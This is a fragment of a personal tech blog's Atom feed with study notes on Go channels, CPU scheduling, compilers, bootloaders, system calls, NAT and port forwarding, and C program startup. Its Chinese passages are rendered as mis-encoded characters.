<span class="comment">// å°†é€šé“æ ‡è®°ä¸ºæ— æ³•é€šè¿‡å‘é€æ“ä½œÂ `&lt;-`Â æ¥å—æ›´å¤šçš„å€¼</span></span><br><span class="line"><span class="comment">// do something</span></span><br><span class="line"><span class="keyword">return</span> ch</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç›¸åº”çš„ï¼Œæ¥æ”¶æ–¹éœ€è¦ä¸€ç§æ–¹æ³•æ£€æµ‹é€šé“æœ‰æ²¡æœ‰è¢«é˜»å¡ï¼ˆæˆ–è¢«å…³é—­ï¼‰ã€‚</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">receive</span><span class="params">(ch <span class="keyword">chan</span> <span class="type">int</span>)</span></span> &#123;</span><br><span class="line"><span class="keyword">if</span> val, stat := &lt;- ch; stat &#123;</span><br><span class="line"><span class="comment">// é€šé“æœªå…³é—­</span></span><br><span class="line">process()</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><p><strong>å‚è€ƒèµ„æ–™ï¼š</strong><br>[1] <a href="https://learnku.com/docs/the-way-to-go/141-concurrency-parallel-and-co-process/3685">https://learnku.com/docs/the-way-to-go/141-concurrency-parallel-and-co-process/3685</a><br>[2] <a href="https://zhuanlan.zhihu.com/p/1888238905700119670">Goroutine å’Œçº¿ç¨‹æ¯”è¾ƒ - çŸ¥ä¹</a><br>[3] <a href="https://studygolang.com/articles/29227?fr=sidebar">GoLang GPM æ¨¡å‹ - Go è¯­è¨€ä¸­æ–‡ç½‘ - Golang ä¸­æ–‡ç¤¾åŒº</a><br>[4] <a href="https://fafucoder.github.io/2021/11/08/golang-goroutine/">https://fafucoder.github.io/2021/11/08/golang-goroutine/</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;Donâ€™t communicateÂ byÂ sharing memory; share memory by communicating.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1 id=&quot;goroutine&quot;&gt;&lt;a class=&quot;markdownI</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Operating System Concepts: Process Scheduling</title>
    <link href="http://example.com/2025/02/28/Operating-System-Concepts-Ch5/"/>
    <id>http://example.com/2025/02/28/Operating-System-Concepts-Ch5/</id>
    <published>2025-02-28T11:15:55.951Z</published>
    <updated>2025-02-28T11:21:25.549Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>Attenion: we use <em><strong>process scheduling</strong></em> when discussing general scheduling concepts.</p></blockquote><h1 id="key-objects"><a class="markdownIt-Anchor" href="#key-objects"></a> Key Objects</h1><ul><li>Introduce CPU-scheduling (object, method, criteria)</li><li>List some common CPU-scheduling algorithms</li></ul><blockquote><p>Q: Why we address <strong>CPU-scheduling</strong> instead of <strong>scheduling</strong> itself?<br>A: Scheduling of this kind is a fundamental operating-system function. Almost all computer resources are scheduled before use.</p></blockquote><h1 id="basic-scheduling-concepts"><a class="markdownIt-Anchor" href="#basic-scheduling-concepts"></a> Basic Scheduling Concepts</h1><h2 id="preemptive-and-nonpreemptive-scheduling"><a class="markdownIt-Anchor" href="#preemptive-and-nonpreemptive-scheduling"></a> Preemptive and Nonpreemptive Scheduling</h2><h3 id="1-preemptive-scheduling"><a class="markdownIt-Anchor" href="#1-preemptive-scheduling"></a> 1.Â Preemptive Scheduling</h3><ul><li><strong>Definition</strong>: In preemptive scheduling, the operating system can interrupt a running process before it completes, allowing another process to use the CPU. This ensures that no single process monopolizes the CPU for too long.</li></ul><h3 id="2-nonpreemptive-scheduling"><a class="markdownIt-Anchor" href="#2-nonpreemptive-scheduling"></a> 2. Nonpreemptive Scheduling</h3><ul><li><strong>Definition</strong>: In nonpreemptive scheduling, once a process starts executing, it cannot be interrupted until it voluntarily releases the CPU (e.g., by terminating or <strong>waiting for I/O</strong>).</li></ul><h2 id="components"><a class="markdownIt-Anchor" href="#components"></a> Components</h2><h3 id="1-cpu-scheduler"><a class="markdownIt-Anchor" href="#1-cpu-scheduler"></a> 1. CPU Scheduler</h3><p><strong>CPU-scheduler</strong>, or <strong>short-term scheduler</strong>, is responsible for selecting one of the processes in the ready queue and allocating the CPU to that process, when the CPU becomes idle.</p><h3 id="2-dispatcher"><a class="markdownIt-Anchor" href="#2-dispatcher"></a> 2. Dispatcher</h3><p>Different from CPU scheduler, <strong>dispatcher</strong> is the module that gives control of the CPU to the selected process. Its function involves the following:</p><ul><li>Switching contex</li><li>Switching to user mode</li><li>Jumping to the proper location in the user program to restart</li></ul><h1 id="scheduling-criteria"><a class="markdownIt-Anchor" href="#scheduling-criteria"></a> Scheduling Criteria</h1><ul><li>CPU utilization: keep CPU as busy as possible</li><li>Throughput: the number of processes completed per time unit</li><li>Turnaround time: the sum of the periods spent waiting, executing and doing I/O</li><li>Waiting time</li><li>Response time</li></ul><h1 id="scheduling-algorithms"><a class="markdownIt-Anchor" href="#scheduling-algorithms"></a> Scheduling Algorithms</h1><ul><li>First-Come, First-Served Scheduling (FCFS)</li><li>Shortest-Job-First Scheduling</li><li>Priority Scheduling</li><li>Round-Robin Scheduling (RR)</li><li>Multilevel Queue Scheduling</li><li>Multilevel Feedback Queue Scheduling (MLFQ)</li></ul><hr><p><strong>Reference:</strong></p><ul><li>DeepSeek</li><li><em>Operating System Concepts, 9th edition</em></li><li><a href="https://www.bilibili.com/video/BV18T1FYMEiJ/?spm_id_from=333.1387.homepage.video_card.click">å† ä»¥å›¾çµå¥–ä¹‹åçš„è°ƒåº¦ç®—æ³•ï¼šMLFQ å¤šçº§åé¦ˆé˜Ÿ</a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;Attenion: we use &lt;em&gt;&lt;strong&gt;process scheduling&lt;/strong&gt;&lt;/em&gt; when discussing general scheduling concepts.&lt;/p&gt;
&lt;/blockquote&gt;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>2024-1å­¦ä¹ æ€è€ƒç‚¹æ»´æ±‡æ€»</title>
    <link href="http://example.com/2025/01/15/%E5%A4%A7%E4%BA%8C%E4%B8%8A%E5%AD%A6%E6%9C%9F%E5%AD%A6%E4%B9%A0%E6%80%9D%E8%80%83%E7%9A%84%E7%82%B9%E6%BB%B4%E6%B1%87%E6%80%BB/"/>
    <id>http://example.com/2025/01/15/%E5%A4%A7%E4%BA%8C%E4%B8%8A%E5%AD%A6%E6%9C%9F%E5%AD%A6%E4%B9%A0%E6%80%9D%E8%80%83%E7%9A%84%E7%82%B9%E6%BB%B4%E6%B1%87%E6%80%BB/</id>
    <published>2025-01-15T09:03:31.781Z</published>
    <updated>2025-01-15T10:08:39.306Z</updated>
    
    <content type="html"><![CDATA[<h1 id="preface"><a class="markdownIt-Anchor" href="#preface"></a> Preface</h1><p>æˆ‘å¾ˆå–œæ¬¢å§œå¤”è¯—ã€Šæš—é¦™ã€‹ä¸­çš„ä¸€å¥è¯ï¼šâ€œç­‰ææ—¶ã€é‡è§…å¹½é¦™ï¼Œå·²å…¥å°çª—æ¨ªå¹…â€ã€‚èº«å¤„åœ¨è®¸å¤šä¸ªâ€œå½“æ—¶â€çš„æˆ‘å¹¶æœªèƒ½å¾ˆå¥½åœ°æŠŠæ¡å¥½å½“ä¸‹ï¼Œè¯šç„¶è¿™æœ‰æ—¶é—´çš„å±€é™æ€§çš„åŸå› ï¼Œæ²¡æ³•ä»¥å…¨å±€çš„è§†è§’ç»Ÿç­¹å¥½æ¯ä¸€æ­¥ï¼Œä½†æˆ‘æ˜¯å¯ä»¥åšåˆ°çš„æ˜¯ä¸æ‡ˆåšæŒä¸éš¾ä»¥è¢«å¤–ç•Œå¹²æ‰°æ‰€æ¶ˆç£¨çš„çƒ­çˆ±å‘€ã€‚â€œå¹´å¹´é™Œä¸Šç”Ÿç§‹è‰â€ï¼Œå¾…åˆ°å›é¦–ï¼Œæ„Ÿè§‰è‡ªå·±å¹¶æ²¡æœ‰åšä»€ä¹ˆï¼Œå®ç°ä»€ä¹ˆã€‚å¯æ˜¯å†ä¸€æ­¥æ­¥å¾€å‰çœ‹ï¼Œå´è¿™å­¦æœŸçš„æ”¶è·æ˜¯è¦æ¯”ä¸Šå­¦æœŸå¤šå¾—å¤šçš„ï¼Œä½†é—æ†¾çš„è¿˜æ˜¯æ²¡èƒ½å®Œæˆè‡ªå·±åˆ¶å®šå¥½çš„è®¡åˆ’å’Œç›®æ ‡ã€‚</p><p>ä»¥ä¸‹æ±‡æ€»äº†æˆ‘åœ¨æ¯æ—¥å­¦ä¹ ä¸­çš„ä¸€äº›ç–‘é—®ä¸æ€è€ƒï¼Œå®ƒä»¬å¯¹æˆ‘æ¥è¯´æ„ä¹‰é‡å¤§ï¼Œæ˜¯æˆ‘è¿™ä¸€å­¦æœŸä¸€ç‚¹ä¸€æ»´æ”¶é›†èµ·æ¥çš„å›°æƒ‘ã€çµæ„Ÿä¸å–œæ‚¦ã€‚æˆ‘å°†å®ƒä»¬æŒ‰ç…§ç‰¹å®šçš„è¯é¢˜åˆ†ç±»ï¼Œåœ¨æˆ‘ä»¥åæœ‰åŒæ ·ç–‘é—®æ—¶èƒ½å¿«é€Ÿåœ°æ‰¾å›ä»¥å‰çš„ç­”æ¡ˆï¼ŒåŒæ—¶ä¹Ÿä¸æ–­ä»¥æ­¤ä¸æ–­å‹‰åŠ±è‡ªå·±â€”â€”ä¸æ–­æ€è€ƒã€ä¿æŒçƒ­çˆ±ï¼</p><hr><h1 id="è½¯ç¡¬ä»¶æŠ€æœ¯"><a class="markdownIt-Anchor" href="#è½¯ç¡¬ä»¶æŠ€æœ¯"></a> è½¯ç¡¬ä»¶æŠ€æœ¯</h1><h2 id="how-the-web-works"><a class="markdownIt-Anchor" href="#how-the-web-works"></a> How the web works</h2><p>å®ç”¨çš„ä¾‹å­: <a href="https://developer.mozilla.org/en-US/docs/Learn/Getting_started_with_the_web/How_the_Web_works">How the web works - Learn web development | MDN (mozilla.org)</a><br><a href="https://www.bilibili.com/video/BV1Bn6BY5E1g/?spm_id_from=333.1387.favlist.content.click">ç½‘ç«™æ˜¯å¦‚ä½•æ„å»ºèµ·æ¥çš„ï¼Ÿbilibili</a></p><h2 id="principle-of-portability-characteristic-in-electron"><a class="markdownIt-Anchor" href="#principle-of-portability-characteristic-in-electron"></a> Principle of portability characteristic in Electron</h2><p><a href="https://juejin.cn/post/7103337772424888356">ä» Electron æ¶æ„å‡ºå‘ï¼Œæ·±ç©¶ Electron è·¨ç«¯åŸç† | å¤šå›¾è¯¦è§£è·¨å¹³å°æ¡Œé¢åº”ç”¨Electronæƒ³å¿…å¤§å®¶éƒ½ä¸ - æ˜é‡‘</a></p><hr><h1 id="éœ€è¦äº†è§£çš„å·¥å…·"><a class="markdownIt-Anchor" href="#éœ€è¦äº†è§£çš„å·¥å…·"></a> éœ€è¦äº†è§£çš„å·¥å…·</h1><h2 id="gui-what-is-qt"><a class="markdownIt-Anchor" href="#gui-what-is-qt"></a> GUI-What is Qt</h2><blockquote><p>Qt is a cross-platform application development framework for desktop, embedded and mobile.</p><p>Qt isÂ <em>not</em>Â a programming language on its own. It is a framework written in C++. A <strong>preprocessor</strong>, theÂ <a href="http://doc.qt.io/qt-5/moc.html">MOC (Meta-Object Compiler)</a>, is used to extend the C++ language with features likeÂ <a href="http://doc.qt.io/qt-5/signalsandslots.html">signals and slots</a>. Before the compilation step, the MOC parses the source files written in Qt-extended C++ and generates standard compliant C++ sources from them. Thus the framework itself and applications/libraries using it can be compiled by any standard compliant C++ compiler like Clang, GCC, ICC, MinGW and MSVC.</p></blockquote><h2 id="gccgnu-compiler-collection-verus-clangllvm"><a class="markdownIt-Anchor" href="#gccgnu-compiler-collection-verus-clangllvm"></a> GCC(GNU Compiler Collection) verus Clang/LLVM</h2><p><a href="https://www.cnblogs.com/findumars/p/14213309.html">GCCä¸Clang / LLVMï¼šC / C ++ç¼–è¯‘å™¨çš„æ·±åº¦æ¯”è¾ƒ - findumars - åšå®¢å›­ (cnblogs.com)</a></p><h3 id="ä¸‰ç§ä¸»æµcç¼–è¯‘å™¨"><a class="markdownIt-Anchor" href="#ä¸‰ç§ä¸»æµcç¼–è¯‘å™¨"></a> ä¸‰ç§ä¸»æµC++ç¼–è¯‘å™¨</h3><p>Visual C ++ï¼ŒGNUç¼–è¯‘å™¨é›†åˆï¼ˆGCCï¼‰å’ŒClang /ä½çº§è™šæ‹Ÿæœºï¼ˆLLVMï¼‰æ˜¯ä¸šç•Œä¸‰ç§ä¸»æµçš„C / C ++ç¼–è¯‘å™¨ã€‚Visual C ++æä¾›äº†å›¾å½¢ç”¨æˆ·ç•Œé¢ï¼ˆGUIï¼‰ï¼Œæ˜“äºè°ƒè¯•ï¼Œä½†ä¸é€‚ç”¨äºLinuxå¹³å°ã€‚å› æ­¤ï¼Œæœ¬æ–‡ä¸»è¦æ¯”è¾ƒGCCä¸Clang / LLVMã€‚</p><p>GCCæ˜¯GNUå¼€å‘çš„ä¸€ç§ç¨‹åºè¯­è¨€ç¼–è¯‘å™¨ã€‚å®ƒæ˜¯æ ¹æ®GNUé€šç”¨å…¬å…±è®¸å¯è¯ï¼ˆGPLï¼‰å’ŒGNUè¾ƒå°é€šç”¨å…¬å…±è®¸å¯è¯ï¼ˆLGPLï¼‰å‘å¸ƒçš„ä¸€ç»„å…è´¹è½¯ä»¶ã€‚å®ƒæ˜¯GNUå’ŒLinuxç³»ç»Ÿçš„å®˜æ–¹ç¼–è¯‘å™¨ï¼Œä¹Ÿæ˜¯ç”¨äºç¼–è¯‘å’Œåˆ›å»ºå…¶ä»–UNIXæ“ä½œç³»ç»Ÿçš„ä¸»è¦ç¼–è¯‘å™¨ã€‚</p><p>LLVMåŒ…å«ä¸€ç³»åˆ—æ¨¡å—åŒ–çš„ç¼–è¯‘å™¨ç»„ä»¶å’Œå·¥å…·é“¾ã€‚å®ƒå¯ä»¥åœ¨ç¼–è¯‘ï¼Œè¿è¡Œæ—¶å’Œç©ºé—²æ—¶é—´ä¼˜åŒ–ç¨‹åºè¯­è¨€å’Œé“¾æ¥ï¼Œå¹¶ç”Ÿæˆä»£ç ã€‚LLVMå¯ä»¥ä½œä¸ºå¤šç§è¯­è¨€çš„ç¼–è¯‘å™¨çš„èƒŒæ™¯ã€‚Clangæ˜¯ä¸€ç§Cï¼ŒC ++ï¼ŒObjective-Cæˆ–Objective-C ++ç¼–è¯‘å™¨ï¼Œ<strong>å®ƒåŸºäºLLVMç”¨C ++ç¼–è¯‘</strong>ï¼Œå¹¶æ ¹æ®Apache 2.0è®¸å¯å‘è¡Œã€‚Clangä¸»è¦ç”¨äºæä¾›ä¼˜äºGCCçš„æ€§èƒ½ã€‚</p><h2 id="difference-between-cmake-and-make"><a class="markdownIt-Anchor" href="#difference-between-cmake-and-make"></a> Difference between Cmake and Make</h2><ul><li><a href="https://makefiletutorial.com/">pratical tutorial of Makefile</a></li><li><a href="https://earthly.dev/blog/cmake-vs-make-diff/">concepts</a></li></ul><hr><h1 id="å››å¤§ä»¶å­¦ä¹ ä¸­çš„çŸ¥è¯†ç‚¹ä¸»è¦æ˜¯os"><a class="markdownIt-Anchor" href="#å››å¤§ä»¶å­¦ä¹ ä¸­çš„çŸ¥è¯†ç‚¹ä¸»è¦æ˜¯os"></a> å››å¤§ä»¶å­¦ä¹ ä¸­çš„çŸ¥è¯†ç‚¹ï¼ˆä¸»è¦æ˜¯OSï¼‰</h1><h2 id="command-interpreterçš„å®ç°"><a class="markdownIt-Anchor" href="#command-interpreterçš„å®ç°"></a> Command interpreterçš„å®ç°</h2><p>Two approaches to implement a command interpreter</p><ol><li>command interpreter contains the code to execute the command<br>Embed the code needed to execute a command directly within theÂ <strong>command interpreter</strong>.This method has the advantage of <strong>faster execution</strong> (think about why?â€“&gt;context switch!) since the command interpreter can immediately access the necessary code <strong>without relying on external system programs</strong>. However, a potential downside is that it may lead to a larger and more complex command interpreter, as it must accommodate the code for all possible commands.</li><li>Implement most commands through system programs (kernel state?)<br>This method offers the advantage of <strong>modularity</strong>, as each command is independent and can be updated or modified without affecting the command interpreter. However, the trade-off for this modularity is that the command interpreter <strong>must rely on external programs</strong> to execute commands, which may result in <strong>slower performance and increased resource usage</strong>, especially if multiple system programs are involved (frequent context switching and mode switching: user mode -&gt; kernel mode).</li></ol><p><a href="https://www.bilibili.com/video/BV1BW421R79Q/?spm_id_from=333.1387.collection.video_card.click&amp;vd_source=00a51e4c2b49db794dc314bf2a3b1e5a">è¿›ç¨‹ç¼–ç¨‹æ¥å£ | Shell æ˜¯å¦‚ä½•æ„å»ºçš„ï¼Ÿ</a></p><h1 id="syscall"><a class="markdownIt-Anchor" href="#syscall"></a> syscall</h1><p>Q: A system call is a process? Difference between process and routine, how latter one execute?<br>A: No, a system call is not a process. Instead, a system call is a mechanism that allows a program (or process) to <strong>request a service from the operating systemâ€™s kernel</strong>, such as accessing hardware resources, creating files, or managing processes. In essence, system calls are indeed pieces of compiled code that the OS kernel provides to handle specific, privileged tasks safely and efficiently.</p><p>è§†é¢‘èµ„æºï¼š<a href="https://www.bilibili.com/video/BV1NFrhYzE5M/?spm_id_from=333.1387.favlist.content.click&amp;vd_source=00a51e4c2b49db794dc314bf2a3b1e5a">99%çš„å¼€å‘è€…å¹¶ä¸ç†è§£ç³»ç»Ÿè°ƒç”¨ï¼Ÿ | ç³»ç»Ÿè°ƒç”¨ å†…æ ¸æ¨¡å¼ ç”¨æˆ·æ¨¡å¼_å“”å“©å“”å“©_bilibili</a></p><h2 id="bootloader"><a class="markdownIt-Anchor" href="#bootloader"></a> Bootloader</h2><p>Q: When a CPU recieves a  reset event, the instruction register is loaded with a predefined memory location, at which is the initial bootstrap program. Then CPU execute the boot loader to load the kernel to the main memory. So why not directly load the kernel to memory when start up?</p><p>How the bootstrap program is loaded and then be executed? Execeute the small piece of code in firmware thoroughly or then load the complete bootstrap into main memory and start its execution?</p><p>A: The bootstrap loader is essential for the startup process because, at power-on or reset, the CPU has very limited capabilityâ€”it doesnâ€™t â€œknowâ€ where or how to load the full operating system. Hereâ€™s how it all works:</p><ol><li><strong>Directly Loading the Kernel</strong>: Loading the kernel directly at startup would mean the CPU would have to know exactly where and how the kernel is stored. But at the time of powering on, the CPU has no information about the storage device (like a hard disk or SSD) or how to access it. <strong>It only has a small set of instructions and memory address where it starts executing upon reset</strong>. Hence, we use a bootstrap loader.</li><li><strong>Bootstrap Process</strong>: When the CPU starts up, it immediately begins executing code from a fixed address, often set to the Basic Input/Output System (BIOS) or similar firmware in modern computers. This code is very minimal and is part of a read-only memory (ROM). This firmware contains a tiny program known as the initial bootstrap loader, which is responsible for <strong>performing the initial checks and locating a more complex loader</strong> (usually on a storage device) that can load the OS.</li><li><strong>How the Bootstrap Program is Loaded</strong>: <strong>The initial bootstrap code in firmware runs completely from ROM.</strong> This code performs essential checks (like the Power-On Self Test) and then searches for a bootable device. Once it locates the storage device containing the bootloader, it loads a small portion of the bootloader into memory.</li><li><strong>From Firmware to Main Memory Execution</strong>: The small firmware-based bootstrap then <strong>loads the complete bootloader</strong> (usually stored in the Master Boot Record or MBR) into main memory. This complete <strong>bootloader now has the necessary instructions to locate and load the kernel</strong>, which then takes over and starts initializing the operating system.</li></ol><p>In summary: <strong>The initial bootstrap in ROM is essential because the CPU lacks any knowledge of storage at startup. This small, firmware-resident code loads a more capable bootloader, which then brings in the OS kernel.</strong></p><h3 id="bootstrap-program-vs-bootloader"><a class="markdownIt-Anchor" href="#bootstrap-program-vs-bootloader"></a> Bootstrap program v.s. Bootloader</h3><p>The bootstrap program (or initial bootstrap) and the bootloader are indeed separate parts of the startup process, and they each play a specific role in getting the OS loaded. Hereâ€™s a quick recap:</p><ol><li><strong>Bootstrap Program</strong>:<ul><li><strong>Location</strong>: Stored in ROM (often part of the firmware, like BIOS or UEFI).</li><li><strong>Purpose</strong>: Executes first, performing initial system checks and finding a bootable device.</li><li><strong>Function</strong>: Loads the bootloader from the storage device (e.g., hard disk, SSD) into main memory.</li><li><strong>Execution</strong>: The CPU automatically starts here when powered on or reset.</li></ul></li><li><strong>Bootloader</strong>:<ul><li><strong>Location</strong>: Stored on a bootable storage device, like in the Master Boot Record (MBR) or a dedicated partition.</li><li><strong>Purpose</strong>: Loads the operating system kernel into main memory.</li><li><strong>Execution</strong>: Once the bootstrap program loads it into RAM, it can execute more complex instructions to locate and load the OS kernel.</li></ul></li><li><strong>Kernel and OS Startup</strong>:<ul><li>Once the bootloader has done its job and loaded the kernel into memory, it transfers control to the kernel.</li><li>At this point, the operating system officially begins to run, taking over full control to initialize and manage hardware, load essential services, and provide an environment for user applications.</li></ul></li></ol><p>So the sequence is: <strong>bootstrap program (in ROM) â†’ bootloader (from storage) â†’ kernel (OS)</strong>. After the kernel loads, the OS is running!</p><h2 id="what-is-abi-application-binary-interface"><a class="markdownIt-Anchor" href="#what-is-abi-application-binary-interface"></a> What is ABI (Application Binary Interface)?</h2><p><strong><em>From wikipedia:</em></strong><br>In computer software, anÂ <strong>application binary interface</strong>Â (<strong>ABI</strong>) is anÂ interfaceÂ between two binary program modules. Often, one of these modules is aÂ libraryÂ orÂ operating systemÂ facility, and the other is a program that is being run by a user.</p><p>An ABI defines how data structures or computational routines are accessed <strong>in manchin code</strong>, which is a low-level, hardware-dependent format. In contrast, anÂ application programming interfaceÂ (API) defines this access <strong>in source code</strong>, which is a relatively high-level, hardware-independent, often human-readableÂ format.</p><h2 id="routine-and-process"><a class="markdownIt-Anchor" href="#routine-and-process"></a> Routine and Process</h2><h3 id="routine"><a class="markdownIt-Anchor" href="#routine"></a> Routine:</h3><ul><li>A routine (also called a <strong>function</strong>, <strong>procedure</strong>, or <strong>subroutine</strong>) is a block of reusable code designed to perform a specific task.</li><li>It runs within the context of a single <strong>process</strong>.</li><li><strong>It is invoked by other parts of a program and executes in the same memory space as the program.</strong> â€“ spot on!</li><li>Examples include standard library functions like <code>printf()</code> in C or a custom function like <code>calculateSum()</code>.</li></ul><h3 id="process"><a class="markdownIt-Anchor" href="#process"></a> Process:</h3><ul><li>A process is an instance of a program that is in execution.</li><li>It is a <strong>larger execution unit</strong> that includes the programâ€™s code, data, and resources (e.g., memory, file handles).</li><li>Processes run independently and are managed by the operating system.</li><li>They often communicate with other processes through mechanisms like inter-process communication (IPC).</li></ul><h2 id="ç«¯å£è½¬å‘ä¸nat"><a class="markdownIt-Anchor" href="#ç«¯å£è½¬å‘ä¸nat"></a> ç«¯å£è½¬å‘ä¸NAT</h2><p>Youâ€™re absolutely right that a NAT gateway inherently performs address translation and reverse mapping as part of its normal operations. Your understanding of how the gateway matches incoming packets to the correct LAN node based on its NAT table is spot-on. Let me clarify where <strong>port forwarding</strong> fits into the picture and why itâ€™s necessary in some cases.</p><h3 id="nat-basics-recap"><a class="markdownIt-Anchor" href="#nat-basics-recap"></a> NAT Basics Recap</h3><ul><li><strong>Outbound traffic</strong>: When a LAN node (e.g., <code>192.168.1.100</code>) sends a packet to an external server, the gateway translates the source IP (<code>192.168.1.100</code>) and port (e.g., <code>10</code>) to its own external IP (<code>1.1.1.1</code>) and a unique port (e.g., <code>3000</code>). This creates an entry in the NAT table that maps <code>(1.1.1.1:3000)</code> to <code>(192.168.1.100:10)</code>.</li><li><strong>Inbound traffic</strong>: When the external server responds to <code>(1.1.1.1:3000)</code>, the gateway checks its NAT table, finds the mapping, and forwards the packet to <code>(192.168.1.100:10)</code>.<br>This works seamlessly <strong>for connections initiated from within the LAN</strong> because the NAT table is populated dynamically when the outbound connection is made.</li></ul><hr><h3 id="the-role-of-port-forwarding"><a class="markdownIt-Anchor" href="#the-role-of-port-forwarding"></a> The Role of Port Forwarding</h3><p>Port forwarding is needed for <strong>connections initiated from outside the LAN</strong> (e.g., an external client trying to access a server or service running inside the LAN). Hereâ€™s why:</p><ol><li><strong>No NAT Table Entry for Unsolicited Traffic</strong>:<ul><li>If an external client sends a packet to <code>1.1.1.1</code> with no prior outbound connection from the LAN, the gateway wonâ€™t have a corresponding NAT table entry.</li><li>The gateway doesnâ€™t know which internal node to forward the packet to, so it drops the packet by default.</li></ul></li><li><strong>Port Forwarding as a Manual Mapping</strong>:<ul><li>Port forwarding creates a static rule in the gateway to map incoming packets with a specific port on the gatewayâ€™s external IP to a specific internal node and port.</li><li>For example, you can configure the gateway to forward traffic on <code>1.1.1.1:8080</code> to <code>192.168.1.100:80</code>.</li></ul></li><li><strong>Use Case</strong>:<ul><li>Say youâ€™re hosting a web server on <code>192.168.1.100</code> (LAN) and want clients from the internet to access it. Without port forwarding, their requests will be dropped because the gateway has no NAT table entry.</li><li>By setting up port forwarding, the gateway knows to forward all packets received on <code>1.1.1.1:8080</code> to <code>192.168.1.100:80</code>, allowing external clients to reach the web server.</li></ul></li></ol><hr><h3 id="how-port-forwarding-differs-from-nat"><a class="markdownIt-Anchor" href="#how-port-forwarding-differs-from-nat"></a> How Port Forwarding Differs from NAT</h3><ul><li><strong>Dynamic vs. Static</strong>:<ul><li>NAT dynamically creates mappings as a result of outgoing connections.</li><li>Port forwarding involves static, predefined mappings for incoming connections.</li></ul></li><li><strong>Purpose</strong>:<ul><li>NAT primarily enables multiple LAN nodes to share a single public IP for outbound traffic.</li><li>Port forwarding enables specific services inside the LAN to be accessible from the outside.</li></ul></li></ul><hr><h3 id="analogy-nat-vs-port-forwarding"><a class="markdownIt-Anchor" href="#analogy-nat-vs-port-forwarding"></a> Analogy: NAT vs. Port Forwarding</h3><p>Think of NAT as a receptionist in an office building:</p><ul><li><strong>Outgoing call</strong>: The receptionist notes which employee is making the call and forwards it to the recipient. When the recipient calls back, the receptionist connects them to the correct employee.</li><li><strong>Incoming call without prior contact</strong>: If someone calls the office without knowing who to talk to, the receptionist doesnâ€™t know where to direct the call unless thereâ€™s a predefined rule (â€œAll calls to extension 8080 go to Bobâ€).</li></ul><p>Port forwarding is like setting up such predefined rules for incoming calls.</p><h2 id="è¿›ç¨‹çš„è¿”å›"><a class="markdownIt-Anchor" href="#è¿›ç¨‹çš„è¿”å›"></a> è¿›ç¨‹çš„è¿”å›</h2><p>Q: A program ends when it execute to <code>return</code>?</p><p>A: A break down the entire process of executing a simple â€œHello, World!â€ program, from when the kernel loads the program to when it gets the exit status back. This includes the key functions like <code>execve</code>, <code>__libc_start_main</code>, and <code>_exit</code>.</p><h3 id="1-source-code"><a class="markdownIt-Anchor" href="#1-source-code"></a> 1. Source Code</h3><p>The simplest â€œHello, World!â€ program in C:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span>  </span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Hello, World!\n&quot;</span>);     </span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-compilation"><a class="markdownIt-Anchor" href="#2-compilation"></a> 2. Compilation</h3><p>When you compile this program (e.g., <code>gcc hello.c -o hello</code>), the following steps occur:</p><ol><li><strong>Translation</strong>:<ul><li>The source code is converted into an object file (<code>hello.o</code>) with machine code.</li></ul></li><li><strong>Linking</strong>:<ul><li>The linker combines <code>hello.o</code> with the C runtime and standard library (e.g., <code>libc.so</code>).</li><li>The resulting binary includes references to external shared libraries (if dynamically linked) or embeds those libraries if statically linked.</li></ul></li></ol><h3 id="3-program-execution"><a class="markdownIt-Anchor" href="#3-program-execution"></a> 3. Program Execution</h3><p>Assuming the compiled program is called <code>hello</code>, when you run <code>./hello</code>, hereâ€™s the step-by-step breakdown:</p><h4 id="step-1-the-kernel-loads-the-progra"><a class="markdownIt-Anchor" href="#step-1-the-kernel-loads-the-progra"></a> Step 1: The Kernel Loads the Progra</h4><ol><li><strong><code>execve</code> System Call</strong>:<ul><li>The shell (or another parent process) calls the <code>execve</code> system call to start your program:<br><code>execve(&quot;./hello&quot;, argv, envp);</code></li><li>The kernel:<ol><li>Reads the programâ€™s ELF header to understand its structure.</li><li>Maps the programâ€™s sections (e.g., code, data, etc.) into memory.</li><li>Sets up the processâ€™s stack with <code>argv</code> and <code>envp</code>.</li></ol></li></ul></li><li><strong>Transfer Control to <code>_start</code></strong>:<ul><li><code>_start</code> is the entry point of the program, specified in the ELF file. It is provided by the C runtime and is the very first code executed in your process.</li></ul></li></ol><h4 id="step-2-_start-initializes-the-program"><a class="markdownIt-Anchor" href="#step-2-_start-initializes-the-program"></a> Step 2: <code>_start</code> Initializes the Program</h4><ol><li><strong>Set Up the Environment</strong><ul><li><code>_start</code> is a small assembly stub that:<ul><li>Sets up the stack and registers.</li><li>Prepares <code>argc</code>, <code>argv</code>, and <code>envp</code> for passing to <code>__libc_start_main</code>.</li></ul></li></ul></li><li><strong>Call <code>__libc_start_main</code></strong>:<ul><li><code>_start</code> calls <code>__libc_start_main</code> (part of <code>libc</code>), passing the address of <code>main()</code> and other parameters:<br><code>__libc_start_main(main, argc, argv, ...);</code></li></ul></li></ol><h4 id="step-3-__libc_start_main-orchestrates-execution"><a class="markdownIt-Anchor" href="#step-3-__libc_start_main-orchestrates-execution"></a> Step 3: <code>__libc_start_main</code> Orchestrates Execution</h4><ol><li><strong>Initialize the Runtime</strong>:<ul><li><code>__libc_start_main</code> does several things before calling <code>main()</code>:<ul><li>Initializes the heap and other runtime 